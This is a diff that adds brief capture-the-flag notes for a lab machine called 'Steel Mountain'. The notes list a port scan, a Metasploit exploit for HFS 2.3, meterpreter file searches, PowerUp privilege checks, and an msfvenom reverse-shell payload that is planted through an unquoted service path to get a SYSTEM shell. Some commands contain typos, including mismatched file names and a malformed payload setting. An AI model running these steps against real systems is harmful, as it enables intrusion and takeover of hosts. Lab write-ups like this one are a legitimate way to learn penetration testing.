@@ -1,0 +1,53 @@
+Steel Mountain
+
+ping 10.10.20.115
+
+nmap -sV -sC 10.10.20.115 -Pn
+
+HFS 2.3 Port= 8080
+
+Exploitation:
+
+msf > use exploit/windows/http/rejetto_hfs_exec
+msf > set lhost or lport or rhost or rport
+msf > exploit
+
+Meterpreter Session:
+
+meterpreter > cd C:\\Users\\bill
+meterpreter > search -f *.txt
+meterpreter > cd Desktop\\
+meterpreter > cat user.txt 
+
+Post-exploitation
+
+meterpreter > getuid
+
+$ wget https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
+
+meterpreter > upload ~/PowerUp.ps1
+meterpreter > load powershell
+meterpreter > powershell_shell
+PS > . .\PowerUp.ps1
+PS > Invoke-AllChecks
+
+# Check : Unquotd Service Paths (unquoted service path vulnerability)
+
+icacls "C:\Program Files (x86)\IObit\Advanced SystemCare"
+# Check Permission
+# we have permission RWE
+
+msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
+
+use exploit/multi/handler
+set payload/windows/x64/shell_reverse_tcp 
+set lport lhost
+exploit -j 
+
+meterpreter > upload ~/ASCSerice.exe
+shell
+C:// > copy ASCSerice.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCSerice.exe"
+C:// > sc AdvanceSystemCareServic9 stop
+C:// > sc AdvanceSystemCareServic9 start
+
+GOT ROOT SHELL
